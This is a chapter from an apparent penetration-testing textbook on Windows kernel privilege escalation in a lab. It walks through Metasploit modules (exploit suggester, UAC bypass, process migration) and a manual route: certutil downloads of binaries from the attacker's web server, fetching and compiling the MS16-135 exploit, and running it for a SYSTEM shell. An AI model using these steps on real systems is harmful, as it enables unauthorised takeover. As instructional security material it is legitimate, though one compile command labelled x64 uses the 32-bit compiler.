<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer138">
			<h1 id="_idParaDest-72"><em class="italic"><a id="_idTextAnchor075"/>Chapter 5</em>: Windows Kernel Exploits</h1>
			<p>Now that we have learned how to enumerate important information from our target system and have identified potential privilege escalation attack vectors, we can begin the privilege escalation process on Windows. The first privilege escalation attack vector we will be exploring is <strong class="bold">kernel exploitation</strong>.</p>
			<p>In this chapter, you will learn how to identify, transfer, and utilize kernel exploits on Windows both manually and automatically.</p>
			<p>You will learn how a kernel works and how you can leverage kernel vulnerabilities to elevate your privileges on the target system. This is a vital part of the privilege escalation process as kernel vulnerabilities provide a straightforward way of elevating your privileges on a target system.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Understanding kernel exploits</li>
				<li>Kernel exploitation with Metasploit</li>
				<li>Manual kernel exploitation</li>
			</ul>
			<h1 id="_idParaDest-73"><a id="_idTextAnchor076"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you have familiarity with Windows CMD commands.</p>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3m7qa47">https://bit.ly/3m7qa47</a></p>
			<h1 id="_idParaDest-74"><a id="_idTextAnchor077"/>Understanding kernel exploits</h1>
			<p>Before we can get <a id="_idIndexMarker294"/>started with utilizing various kernel exploits on Windows, it is vitally important to understand what a kernel is and how it is set up and configured.</p>
			<p>This will give you a clearer picture of how and why kernels are exploited and how they can be exploited to elevate privileges on Windows.</p>
			<p>Let's begin by understanding what a <a id="_idIndexMarker295"/>kernel is and what functions it serves in the context of an operating system.</p>
			<h2 id="_idParaDest-75"><a id="_idTextAnchor078"/>What is a kernel?</h2>
			<p>A kernel is a computer program <a id="_idIndexMarker296"/>that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.</p>
			<p>The kernel runs in system memory and is loaded immediately after the bootloader during the system startup process and is responsible for handling the remaining startup procedures for the operating system. </p>
			<p>The kernel is responsible for performing the <a id="_idIndexMarker297"/>following main functions:</p>
			<ul>
				<li><strong class="bold">Memory management</strong>: The kernel is responsible for reading to, writing to, allocating, and deallocating system memory.</li>
				<li><strong class="bold">Device management</strong>: The kernel is responsible for managing and facilitating the I/O operations between the hardware peripherals and the operating system.</li>
				<li><strong class="bold">I/O management</strong>: The kernel is responsible for facilitating and managing the I/O operations between system resources such as the CPU and system memory.</li>
				<li><strong class="bold">Resource management</strong>: The kernel is responsible for managing the allocation and sharing of memory between various programs and processes. </li>
			</ul>
			<p>As illustrated in the following diagram, the kernel acts as an intermediary between hardware and software and facilitates and translates their interaction:</p>
			<div>
				<div id="_idContainer118" class="IMG---Figure">
					<img src="Images/B17389_05_001.jpg" alt="Figure 5.1 – Kernel structure&#13;&#10;" width="381" height="222"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.1 – Kernel structure</p>
			<p>Now that we have a <a id="_idIndexMarker298"/>clear understanding of what a kernel is, what its functions are, and its role in an operating system, it becomes clear that a vulnerability within the kernel can be exploited and can potentially lead to privileged access and control over a system. It is for this reason that kernel exploits are valued by attackers during the privilege escalation process, as they offer a straightforward path for elevating privileges.</p>
			<p>It is to be noted, however, that kernel exploits can be unstable and may lead to system crashes and therefore need to be executed with tact and care. This is primarily because kernel exploits target the kernel and its functionality, therefore interfering with the core operation of the operating system as a whole. Consequently, system crashes caused by kernel exploits can lead to data loss and damage the operating system as a whole, which can become a liability during a penetration test.</p>
			<p>Let's take a brief look at the Windows kernel and how it is structured to get an understanding of how it functions.</p>
			<h2 id="_idParaDest-76"><a id="_idTextAnchor079"/>Windows NT </h2>
			<p>Windows NT is the kernel that <a id="_idIndexMarker299"/>comes pre-packaged with all versions of Microsoft Windows and operates <a id="_idIndexMarker300"/>like a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware: </p>
			<ul>
				<li><strong class="bold">User mode</strong>: Programs and services <a id="_idIndexMarker301"/>running in user mode have limited access to system resources and functionality. </li>
				<li><strong class="bold">Kernel mode</strong>: Kernel mode <a id="_idIndexMarker302"/>has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.</li>
			</ul>
			<p>As illustrated in the <a id="_idIndexMarker303"/>following diagram, the two main modes of operation are used to segregate access to resources and hardware:</p>
			<div>
				<div id="_idContainer119" class="IMG---Figure">
					<img src="Images/B17389_05_002.jpg" alt="Figure 5.2 – Windows kernel structure&#13;&#10;" width="507" height="436"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.2 – Windows kernel structure</p>
			<p>User mode consists of <a id="_idIndexMarker304"/>system-defined processes that communicate with the kernel through the use of Windows APIs. The processes running in user mode can also communicate with devices by sending I/O requests to the kernel-mode device drivers as highlighted in <em class="italic">Figure 5.2</em>.</p>
			<p>Kernel mode has access to all devices and system resources and is also responsible for preventing user-mode services from interacting with and accessing functionality that they do not have access to.</p>
			<p>Now that we have an <a id="_idIndexMarker305"/>understanding of how the Windows kernel functions and how it <a id="_idIndexMarker306"/>is structured, we can begin to delve into the Windows kernel exploitation process.</p>
			<h2 id="_idParaDest-77"><a id="_idTextAnchor080"/>The Windows kernel exploitation process</h2>
			<p>The Windows operating system is <a id="_idIndexMarker307"/>vulnerable to various attacks that can lead to exploitation or privilege escalation. We have already explored the <a id="_idIndexMarker308"/>process of identifying these vulnerabilities and their corresponding exploits in the previous chapter. In this chapter, we will be primarily focusing on how to correctly identify and exploit unpatched and vulnerable Windows systems to elevate our privileges. </p>
			<p>This process will follow a two-pronged approach that will encompass the process of utilizing kernel exploits both manually and automatically. </p>
			<p>Kernel exploits on Windows will typically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell. This process will differ based on the version of Windows being targeted and the kernel exploit being used.</p>
			<p>In this chapter, we will be using the <strong class="bold">Windows 7 SP1</strong> target virtual machine in our virtual hacking lab.</p>
			<p>We can now begin the kernel exploitation process with the Metasploit framework. This will allow us to automate the process of identifying and exploiting kernel vulnerabilities on Windows. </p>
			<h1 id="_idParaDest-78"><a id="_idTextAnchor081"/>Kernel exploitation with Metasploit</h1>
			<p>We can begin the <a id="_idIndexMarker309"/>kernel exploitation process by taking a <a id="_idIndexMarker310"/>look at how to use kernel exploits with the <strong class="bold">Metasploit</strong> framework. The Metasploit framework will offer an automated and modularized solution and will streamline the exploitation process.</p>
			<p>For this section, our target system will be the Windows SP1 virtual machine. As a prerequisite, ensure that you have gained your <a id="_idIndexMarker311"/>initial foothold on the system and have a <strong class="bold">Meterpreter</strong> session:</p>
			<ol>
				<li>The first step involves <a id="_idIndexMarker312"/>scanning the target for <a id="_idIndexMarker313"/>potential exploits. We will be using the <strong class="source-inline">local_exploit_suggester</strong> module. This process was covered in depth in the previous chapter. </li>
				<li>We can load the module in Metasploit by running the following command:<p class="source-code"><strong class="bold">use post/multi/recon/local_exploit_suggester</strong></p></li>
				<li>After loading the module, you will need to set the <strong class="source-inline">SESSION</strong> option for the module. The <strong class="source-inline">SESSION</strong> option requires the session ID of your Meterpreter session. This can be done by running the following command:<p class="source-code"><strong class="bold">set SESSION &lt;SESSION-ID&gt;</strong></p><p>As illustrated in the following screenshot, the <strong class="source-inline">SESSION</strong> option should reflect the session ID you set:</p><div id="_idContainer120" class="IMG---Figure"><img src="Images/B17389_05_003.jpg" alt="Figure 5.3 – local_exploit_suggester options" width="1273" height="247"/></div><p class="figure-caption">Figure 5.3 – local_exploit_suggester options</p></li>
				<li>After configuring the module options, we can run the module by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>This will begin the scanning process. During the process, the module will begin to output the various exploits that the target is potentially vulnerable to as highlighted in the following screenshot:</p><div id="_idContainer121" class="IMG---Figure"><img src="Images/B17389_05_004.jpg" alt="Figure 5.4 – local_exploit_suggester results&#13;&#10;" width="1383" height="264"/></div><p class="figure-caption">Figure 5.4 – local_exploit_suggester results</p></li>
				<li>We can begin testing the various exploit <a id="_idIndexMarker314"/>modules recommended by <strong class="source-inline">local_exploit_suggester</strong>. The first few modules in the <a id="_idIndexMarker315"/>output usually have a higher chance of working successfully. We can test the first module in the list as highlighted in <em class="italic">Figure 5.4</em> by loading the module. This can be done by running the following command:<p class="source-code"><strong class="bold">use /exploit/windows/local/bypassuac_eventvwr</strong></p><p>This kernel exploit module <a id="_idIndexMarker316"/>will bypass <strong class="bold">User Access Control</strong> (<strong class="bold">UAC</strong>) and insert a command in the Windows Registry that will be executed when the Windows Event Viewer is launched and will spawn a system shell – in this case, a Meterpreter session.</p><p class="callout-heading">Note</p><p class="callout">This exploit does not exploit a vulnerability in the kernel, as it interacts and stores commands in the Windows Registry.</p><p>More information regarding this exploit module can be found here: <a href="https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/%20">https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/.</a></p></li>
				<li>After loading the module, you will need to set the module options, which will include the Meterpreter session ID and the payload options for the new Meterpreter session as highlighted in the following screenshot:<div id="_idContainer122" class="IMG---Figure"><img src="Images/B17389_05_005.jpg" alt="Figure 5.5 – Kernel exploit module options" width="1181" height="559"/></div><p class="figure-caption">Figure 5.5 – Kernel exploit module options</p></li>
				<li>We can now <a id="_idIndexMarker317"/>run the kernel exploit module by <a id="_idIndexMarker318"/>running the following command:<p class="source-code"><strong class="bold">exploit</strong></p><p>In this case, the exploit is successful, as seen in the following screenshot. As a result, we will get a Meterpreter session with elevated privileges:</p><div id="_idContainer123" class="IMG---Figure"><img src="Images/B17389_05_006.jpg" alt="Figure 5.6 – Exploit successful&#13;&#10;" width="1215" height="369"/></div><p class="figure-caption">Figure 5.6 – Exploit successful</p></li>
				<li>We can now enumerate the privileges we have on the system by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>The output is as shown in the following screenshot:</p><div id="_idContainer124" class="IMG---Figure"><img src="Images/B17389_05_007.jpg" alt="Figure 5.7 – Meterpreter privileges&#13;&#10;" width="373" height="80"/></div><p class="figure-caption">Figure 5.7 – Meterpreter privileges</p><p>As shown in the <a id="_idIndexMarker319"/>preceding screenshot, we do not <a id="_idIndexMarker320"/>yet have elevated privileges, however, we can list out the privileges we have on the current Meterpreter session by running the following command:</p><p class="source-code"><strong class="bold">getprivs</strong></p><p>The output is as shown in the following screenshot:</p><div id="_idContainer125" class="IMG---Figure"><img src="Images/B17389_05_008.jpg" alt="Figure 5.8 – Meterpreter privileges&#13;&#10;" width="387" height="734"/></div><p class="figure-caption">Figure 5.8 – Meterpreter privileges</p><p>As shown in the <a id="_idIndexMarker321"/>preceding screenshot, this <a id="_idIndexMarker322"/>Meterpreter session has administrative privileges and we can migrate to an <strong class="source-inline">NT AUTHORITY/SYSTEM</strong><em class="italic"> </em>process.</p></li>
				<li>We can enumerate the running processes by running the following command:<p class="source-code"><strong class="bold">ps</strong></p><p>This command will output a list of running processes, their respective process IDs, and the process owner, as shown in the following screenshot:</p><div id="_idContainer126" class="IMG---Figure"><img src="Images/B17389_05_009.jpg" alt="Figure 5.9 – Meterpreter processes " width="1315" height="306"/></div><p class="figure-caption">Figure 5.9 – Meterpreter processes </p></li>
				<li>We can migrate to the <strong class="source-inline">winlogon.exe</strong> process as it is <a id="_idIndexMarker323"/>owned by the <strong class="source-inline">NT AUTHORITY/SYSTEM</strong> user. This <a id="_idIndexMarker324"/>can be done by running the following command:<p class="source-code"><strong class="bold">migrate &lt;PID&gt;</strong></p><p>After successful migration, we can recheck our privileges by running the <strong class="source-inline">getuid</strong> command or the <strong class="source-inline">whoami</strong> command within a system shell:</p></li>
			</ol>
			<div>
				<div id="_idContainer127" class="IMG---Figure">
					<img src="Images/B17389_05_010.jpg" alt="Figure 5.10 – Successful privilege escalation" width="444" height="75"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.10 – Successful privilege escalation</p>
			<p>As shown in the preceding screenshot, we have successfully elevated our privileges and can run system commands and access any resource on the system.</p>
			<p>We now have elevated privileges on the system and can begin performing post-exploitation procedures. It is recommended to set up persistence for the elevated Meterpreter session in the event the process is killed or the system is shut down.</p>
			<p>This process will differ depending on the type of exploit module and the type of attack being performed, however, the process will remain similar when using the Metasploit framework.</p>
			<p>The kernel exploitation process with Metasploit is much more streamlined as a lot of the steps can be automated, however, you might be in a situation where you only have access via a standard shell as opposed to a <a id="_idIndexMarker325"/>Meterpreter session. This is <a id="_idIndexMarker326"/>where manual kernel exploitation comes into play.</p>
			<h1 id="_idParaDest-79"><a id="_idTextAnchor082"/>Manual kernel exploitation</h1>
			<p>In some cases, you will <a id="_idIndexMarker327"/>not have access to a target with a Meterpreter session or you may have exploited the target through a manual exploitation technique such as a web shell. In that event, you will have access through a standard reverse shell most likely <a id="_idIndexMarker328"/>facilitated through <strong class="bold">netcat</strong>. This poses a few issues; how can I scan the target for potential kernel exploits? And how can I transfer over the kernel exploit to the target?</p>
			<p>These are the issues we will be addressing in this section; our target of choice will be the Windows 7 virtual machine.</p>
			<h2 id="_idParaDest-80"><a id="_idTextAnchor083"/>Local enumeration</h2>
			<p>The first step is <a id="_idIndexMarker329"/>to scan and identify potential kernel vulnerabilities. This can be done through the use of the <strong class="bold">Windows-Exploit-Suggester</strong> tool or other <a id="_idIndexMarker330"/>enumeration scripts and tools. In this case, we will utilize the <strong class="bold">winPEAS</strong> binary to enumerate <a id="_idIndexMarker331"/>information from our target.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">winPEAS is a local Windows enumeration script that searches and scans for potential vulnerabilities and enumerates all important system information that can be used to stage a privilege escalation attack.</p>
			<p>The <strong class="bold">winPEAS</strong> binary can be downloaded from the GitHub repository here: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe%20">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe.</a></p>
			<p>Ensure you download the correct binary based on the architecture of your target operating system; the architecture-specific binaries can be found in the <strong class="source-inline">binaries</strong> folder as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer128" class="IMG---Figure">
					<img src="Images/B17389_05_011.jpg" alt="Figure 5.11 – winPEAS binaries&#13;&#10;" width="645" height="350"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.11 – winPEAS binaries</p>
			<p>After downloading the <a id="_idIndexMarker332"/>binary to our Kali VM, we need to transfer the <strong class="source-inline">winPEAS.exe</strong> binary to our target virtual machine. This cannot be done automatically as we do not have a Meterpreter session. As a result, we will need to make use of Windows-specific utilities to download the binary.</p>
			<h2 id="_idParaDest-81"><a id="_idTextAnchor084"/>Transferring files</h2>
			<p>In order to transfer the <strong class="source-inline">winPEAS.exe</strong> binary to our target, we will need to set up a web server on our <a id="_idIndexMarker333"/>Kali VM that will be used to host the binary so that we can download it on the target system. This can be done by following the procedure outlined here:</p>
			<ol>
				<li value="1">To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">winPEAS.exe</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">SimpleHTTPServer</strong> is a Python module for both Python 2 and Python 3.</p><p>As highlighted in the following screenshot, the <strong class="source-inline">SimpleHTTPServer</strong> module will serve the files in the directory on the Kali VM IP address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer129" class="IMG---Figure"><img src="Images/B17389_05_012.jpg" alt="Figure 5.12 – SimpleHTTPServer&#13;&#10;" width="766" height="124"/></div><p class="figure-caption">Figure 5.12 – SimpleHTTPServer</p></li>
				<li>In order to <a id="_idIndexMarker334"/>download the <strong class="source-inline">winPEAS.exe</strong> binary onto the target system, we can utilize the <strong class="source-inline">certutil</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the current user's desktop as illustrated in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer130" class="IMG---Figure">
					<img src="Images/B17389_05_013.jpg" alt="Figure 5.13 – Default user directory" width="284" height="193"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.13 – Default user directory</p>
			<p>We can now use the <strong class="source-inline">certutil</strong> utility to download the binary from the Kali VM to our target system. This can be done by running the following command on the target system:</p>
			<p class="source-code"><strong class="bold">certutil -urlcache -f http://&lt;KALI-VM&gt;/winPEASx64.exe winPEAS.exe</strong></p>
			<p>The output for this command can be seen in the following screenshot:</p>
			<div>
				<div id="_idContainer131" class="IMG---Figure">
					<img src="Images/B17389_05_014.jpg" alt="Figure 5.14 – certutil successful transfer&#13;&#10;" width="991" height="452"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.14 – certutil successful transfer</p>
			<p>As shown in the <a id="_idIndexMarker335"/>preceding screenshot, if the transfer is successful, the binary should be downloaded and saved with the name we specified.</p>
			<p>We can now use the winPEAS binary to enumerate potential kernel vulnerabilities that we can use to elevate our privileges.</p>
			<h2 id="_idParaDest-82"><a id="_idTextAnchor085"/>Enumerating kernel exploits</h2>
			<p>The winPEAS binary enumerates a <a id="_idIndexMarker336"/>lot of information and will perform various checks to discover potential vulnerabilities. In the context of kernel exploits, we only need to enumerate the system information. This can be done by going through the procedure outlined as follows:</p>
			<ol>
				<li value="1">To enumerate all important system information, we need to run the <strong class="source-inline">winPEAS.exe</strong> binary with the following parameter:<p class="source-code"><strong class="bold">.\winPEAS.exe systeminfo</strong></p><p>As shown in the following screenshot, the binary will enumerate system information and, based on the build version and the hotfixes installed, it will output a list of kernel exploits that can be used to elevate privileges:</p><div id="_idContainer132" class="IMG---Figure"><img src="Images/B17389_05_015.jpg" alt="Figure 5.15 – winPEAS kernel exploits&#13;&#10;" width="1155" height="545"/></div><p class="figure-caption">Figure 5.15 – winPEAS kernel exploits</p></li>
				<li>We can also <a id="_idIndexMarker337"/>utilize the <strong class="bold">Windows-Exploit-Suggester</strong> tool to <a id="_idIndexMarker338"/>enumerate our system information and scan for potential kernel exploits. This can be done by running the following command:<p class="source-code"><strong class="bold">./windows-exploit-suggester.py -–database &lt;database&gt;.xlsx -–systeminfo &lt;systeminfo&gt;.txt</strong></p><p>The <strong class="bold">Windows-Exploit-Suggester</strong> script can be <a id="_idIndexMarker339"/>downloaded from this link: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester%20">https://github.com/AonCyberLabs/Windows-Exploit-Suggester.</a></p><p>As outlined in the following screenshot, the script will enumerate all potential kernel exploits that can be used to elevate privileges. We can now use this information to determine the correct kernel exploit to use:</p><div id="_idContainer133" class="IMG---Figure"><img src="Images/B17389_05_016.jpg" alt="Figure 5.16 – Windows-Exploit-Suggester kernel exploits&#13;&#10;" width="1642" height="538"/></div><p class="figure-caption">Figure 5.16 – Windows-Exploit-Suggester kernel exploits</p></li>
				<li>It is always <a id="_idIndexMarker340"/>recommended to use the first exploits output by the enumeration tools and scripts. In this case, we will start off <a id="_idIndexMarker341"/>with the <strong class="bold">MS16-135</strong> kernel exploit. We will need to determine more information about the exploit and how it should be used. We can do this by performing a quick Google search as highlighted in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer134" class="IMG---Figure">
					<img src="Images/B17389_05_017.jpg" alt="Figure 5.17 – MS16-135 exploit search&#13;&#10;" width="730" height="413"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.17 – MS16-135 exploit search</p>
			<p>The Google search reveals a GitHub repository that contains information regarding the exploit, the exploit source code, and how it should be used.</p>
			<p>It is always <a id="_idIndexMarker342"/>recommended to analyze the source code to ensure that it is not malicious and works as intended to make any additional modifications required. Let's take a look at how to compile a Windows exploit from source.</p>
			<h2 id="_idParaDest-83"><a id="_idTextAnchor086"/>Compiling Windows exploits</h2>
			<p>The ability to modify and compile exploits is extremely important as it allows you to ensure the exploit <a id="_idIndexMarker343"/>works as intended and provides you with the flexibility to make modifications to the exploit as per your requirements. In this case, we will be taking a look at how to compile the exploit code into a binary manually:</p>
			<ol>
				<li value="1">To begin with, we must ensure that our Kali Linux VM has all the necessary build tools required for compiling Windows binaries. This can be done by running the following command:<p class="source-code"><strong class="bold">sudo apt install mingw-w64</strong></p></li>
				<li>You will now need to download the exploit code to the Kali VM. This can either be done directly or through the <strong class="source-inline">wget</strong> utility as follows:<p class="source-code"><strong class="bold">wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/41015.c</strong></p></li>
				<li>We can now begin the compilation process, however, based on the target system's architecture, we will need to compile the source code differently.<p>For x64-based operating systems, run the following command, and substitute the parameters with your own files and output names:</p><p class="source-code"><strong class="bold">i686-w64-mingw32-gcc exploit.c -o exploit.exe</strong></p><p>If the target is a 32-bit system, run the following command:</p><p class="source-code"><strong class="bold">i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32</strong></p></li>
			</ol>
			<p>This will compile the exploit into a <a id="_idIndexMarker344"/>binary that we can then transfer over to our target to be executed.</p>
			<h2 id="_idParaDest-84"><a id="_idTextAnchor087"/>Running the kernel exploit</h2>
			<p>After successful <a id="_idIndexMarker345"/>compilation of the exploit code, we can transfer over the compiled binary to the target system and execute it based on the instructions provided in the documentation of the exploit. This can be done by following the procedures outlined as follows:</p>
			<ol>
				<li value="1">In this particular case, the execution of the kernel exploit binary is straightforward and only requires the specification of the target operating system version. Before we can execute it, we need to transfer the exploit over to the target. This can be done by starting a local web server on the Kali VM with the <strong class="source-inline">SimpleHTTPServer</strong> Python module:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p></li>
				<li>In order to download the binary onto the target system, we can utilize the <strong class="source-inline">certutil</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the current user's desktop as shown in the following screenshot:<div id="_idContainer135" class="IMG---Figure"><img src="Images/B17389_05_018.jpg" alt="Figure 5.18 – Default user directory" width="292" height="193"/></div><p class="figure-caption">Figure 5.18 – Default user directory</p><p>We can now use the <strong class="source-inline">certutil</strong> utility to download the binary from the Kali VM to our target system. This can be done by running the following command on the target system:</p><p class="source-code"><strong class="bold">certutil -urlcache -f http://&lt;KALI-VM&gt;/exploit.exe exploit.exe</strong></p></li>
				<li>We can now run the exploit binary by executing it on the target as follows:<p class="source-code"><strong class="bold">.\exploit.exe</strong></p><p>The output of the <a id="_idIndexMarker346"/>preceding command is shown in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer136" class="IMG---Figure">
					<img src="Images/B17389_05_019.jpg" alt="Figure 5.19 – Exploit options" width="858" height="288"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.19 – Exploit options</p>
			<p>As highlighted in <em class="italic">Figure 5.19</em>, the exploit requires the user to specify the target operating system. This can be done by executing the exploit with the following option:</p>
			<p class="source-code"><strong class="bold">.\exploit.exe 7</strong></p>
			<p>After running the exploit with the operating system specified, it will take a few seconds to complete, after which we should have an elevated shell with <strong class="source-inline">nt authority\system</strong> privileges:</p>
			<div>
				<div id="_idContainer137" class="IMG---Figure">
					<img src="Images/B17389_05_020.jpg" alt="Figure 5.20 – Manual kernel exploit successful&#13;&#10;" width="727" height="268"/>
				</div>
			</div>
			<p class="figure-caption">Figure 5.20 – Manual kernel exploit successful</p>
			<p>As highlighted in the <a id="_idIndexMarker347"/>preceding screenshot, the exploit ran successfully and elevated our privileges automatically.</p>
			<p>We are now able to successfully run Windows kernel exploits both manually and automatically and can begin exploring other privilege escalation vectors.</p>
			<h1 id="_idParaDest-85"><a id="_idTextAnchor088"/>Summary</h1>
			<p>In this chapter, we got started with identifying and running kernel exploits automatically with the Metasploit framework. We then looked at how to identify, compile, and transfer kernel exploits manually. We then ended the chapter with how to execute kernel exploits on the target system successfully in order to elevate our privileges on the target system.</p>
			<p>Now that we have learned how to perform kernel exploitation on Windows, we can begin exploring other privilege escalation vectors.</p>
			<p>In the next chapter, we will explore impersonation attacks on Windows and how they can lead to successful privilege escalation. </p>
		</div>
	</div></body></html>